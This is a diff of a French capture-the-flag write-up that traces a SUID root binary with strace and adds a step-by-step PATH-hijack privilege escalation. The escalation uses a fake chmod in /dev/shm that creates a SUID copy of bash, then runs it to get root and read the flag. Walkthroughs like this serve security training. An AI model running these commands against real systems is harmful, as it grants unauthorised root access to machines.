@@ -972,13 +972,19 @@ Le binaire est un ELF SUID 64 bits. `strings` aurait pu fournir rapidement des i
 
 Pour comprendre ce que fait réellement `/usr/local/bin/docker-security`, tu passes donc à une analyse dynamique avec `strace`.
 
-Pour commencer, tu traces uniquement les appels `execve` :
+Pour commencer, tu exécutes le binaire en enregistrant une trace complète dans un fichier temporaire :
 
 ```bash
-strace -f -e trace=execve /usr/local/bin/docker-security
+strace -f -o /tmp/docker-security.strace /usr/local/bin/docker-security 2>/dev/null
 ```
 
-L’option `-f` est importante, car le programme lance des processus enfants. Sans elle, tu ne verrais pas les commandes exécutées par ces sous-processus. Le filtre `-e trace=execve` limite la sortie aux exécutions de programmes, ce qui permet d’identifier rapidement les fichiers réellement exécutés par `docker-security`.
+L’option `-f` est importante, car le programme lance des processus enfants. Sans elle, tu ne verrais pas les commandes exécutées par ces sous-processus. L’option `-o` permet d’écrire la trace dans un fichier, ce qui rend l’analyse plus simple.
+
+Tu recherches ensuite les appels `execve`, qui correspondent aux programmes exécutés :
+
+```bash
+grep -n "execve" /tmp/docker-security.strace
+```
 
 La sortie montre que le binaire lance deux commandes `chmod` :
 
@@ -987,13 +993,15 @@ execve("/bin/sh", ["sh", "-c", "chmod 700 /usr/bin/docker"], ...)
 execve("/bin/sh", ["sh", "-c", "chmod 660 /var/run/docker.sock"], ...)
 ```
 
-Tu peux donc poursuivre l’analyse en filtrant la trace sur `chmod` :
+Maintenant que tu sais que `chmod` est appelé, tu filtres la trace sur ce mot-clé :
+
+```bash
+grep -n "chmod" /tmp/docker-security.strace
+```
 
 ```bash
 strace -f /usr/local/bin/docker-security 2>&1 | grep chmod
 ```
-
-> La redirection `2>&1` est nécessaire, car `strace` écrit sa sortie sur `stderr`. Sans cette redirection, le pipe vers `grep` ne reçoit pas les lignes de trace.
 
 Cette fois, la sortie montre que le shell recherche `chmod` dans les répertoires du `PATH` :
 
@@ -1004,16 +1012,92 @@ stat("/usr/sbin/chmod", ...) = -1 ENOENT (No such file or directory)
 stat("/usr/bin/chmod", ...) = 0
 ```
 
-Le programme finit donc par exécuter le vrai binaire `/usr/bin/chmod` :
-
-```text
-execve("/usr/bin/chmod", ["chmod", "700", "/usr/bin/docker"], ...)
-execve("/usr/bin/chmod", ["chmod", "660", "/var/run/docker.sock"], ...)
-```
-
 Cette résolution via le `PATH` est la faiblesse exploitable. Comme `docker-security` est un binaire SUID appartenant à `root`, tu peux tenter de placer un faux `chmod` dans un répertoire contrôlé, puis modifier le `PATH` pour que ce faux `chmod` soit exécuté à la place de `/usr/bin/chmod`.
 
+### Exploitation avec un faux chmod
 
+L’analyse avec `strace` montre que `docker-security` appelle `chmod` sans chemin absolu. Comme le binaire est SUID root, tu peux tenter un détournement de `PATH`.
+
+L’idée est de créer un faux `chmod` dans un répertoire que tu contrôles. Ce faux `chmod` va copier `/bin/bash` vers `/tmp/rootbash`, puis lui ajouter le bit SUID.
+
+Tu te places dans `/dev/shm`, un répertoire temporaire dans lequel tu peux écrire :
+
+```bash
+cd /dev/shm
+```
+
+Tu crées ensuite le faux `chmod` :
+
+```bash
+cat > chmod << 'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+/bin/chmod 4755 /tmp/rootbash
+EOF
+```
+
+Tu le rends exécutable :
+
+```bash
+chmod +x chmod
+```
+
+Tu modifies ensuite le `PATH` pour que `/dev/shm` soit consulté avant les répertoires système :
+
+```bash
+export PATH=/dev/shm:$PATH
+```
+
+Tu relances alors le binaire SUID :
+
+```bash
+/usr/local/bin/docker-security
+```
+
+Cette fois, lorsque `docker-security` appelle `chmod`, le shell trouve d’abord ton faux `chmod` dans `/dev/shm`. Le script est donc exécuté avec les privilèges du binaire SUID, ce qui crée `/tmp/rootbash` avec le bit SUID.
+
+Tu vérifies la présence du fichier :
+
+```bash
+ls -la /tmp/rootbash
+```
+
+Tu dois obtenir un binaire appartenant à `root` avec le bit SUID actif :
+
+```bash
+-rwsr-xr-x 1 root root ... /tmp/rootbash
+```
+
+Tu peux maintenant lancer ce bash avec l’option `-p` pour conserver les privilèges effectifs :
+
+```bash
+/tmp/rootbash -p
+```
+
+Tu confirmes les privilèges :
+
+```bash
+id
+```
+
+Résultat :
+
+```bash
+uid=1000(dexter) gid=1000(dexter) euid=0(root) groups=1000(dexter)
+```
+
+Le shell s’exécute avec un `euid=0` ce qui confirme que tu disposes maintenant des privilèges `root`.
+
+### root.txt
+
+Tu peux maintenant lire le flag root.txt
+
+```
+cat /root/root.txt
+3213xxxxxxxxxxxxxxxxxxxxxxxxxxx310d
+```
+
+La lecture de `root.txt` confirme la compromission complète de la machine..
 
 ---
 
